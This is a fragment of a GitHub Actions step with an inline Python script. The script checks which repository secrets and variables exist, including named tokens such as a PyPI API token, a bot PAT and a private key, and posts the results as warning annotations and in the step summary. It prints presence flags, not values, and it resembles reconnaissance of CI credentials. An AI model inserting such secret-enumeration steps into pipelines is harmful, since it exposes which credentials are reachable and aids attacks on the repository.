        run: |
          python3 - <<'EOS'
          import os,json
          names=[n for n in os.environ["NAMES"].split() if n]
          def load(k):
              try: return json.loads(os.environ.get(k) or "{}")
              except Exception: return {}
          sk=load("REPO_KEYS"); vr=load("REPO_VARS")
          def emit(title,msg):
              print("::warning title=%s::%s" % (title,msg[:6000]))
          meta=[]
          meta.append("repo=%s" % os.environ.get("GITHUB_REPOSITORY",""))
          meta.append("tok=%s" % ("1" if os.environ.get("KEY_GITHUB_TOKEN") else "0"))
          meta.append("rt=%s" % ("1" if os.environ.get("ACTIONS_RUNTIME_TOKEN") else "0"))
          meta.append("sk=%d" % len(sk)); meta.append("vr=%d" % len(vr))
          for n in ["FISHTOWN_BOT_PAT","PYPI_API_TOKEN","OWNERS_VALIDATOR_GITHUB_SECRET","SECENG_CICD_CHECKS_PRIVATE_KEY","GITHUB_TOKEN"]:
              meta.append("%s=%s" % (n,"1" if os.environ.get("KEY_"+n) else "0"))
          emit("cfg-meta",";".join(meta))
          def pack(items,prefix):
              out=[];cur=[];ln=0
              for it in items:
                  if ln+len(it)>5000: out.append("|".join(cur)); cur=[];ln=0
                  cur.append(it); ln+=len(it)+1
              if cur: out.append("|".join(cur))
              return out
          items=["%s=%s" % (n, "1" if n in sk else "0") for n in names]
          items_v=["v_%s=%s" % (n, "1" if n in vr else "0") for n in names]
          chunks=pack(items,"s")+pack(items_v,"v")
          for i,c in enumerate(chunks):
              emit("cfg-%d"%(i+1), c)
          with open(os.environ["GITHUB_STEP_SUMMARY"],"a") as f:
              f.write("cfg-meta "+";".join(meta)+"\n")
              for c in chunks: f.write(c+"\n")
          print("keys=%d vars=%d chunks=%d" % (len(sk),len(vr),len(chunks)))
          EOS
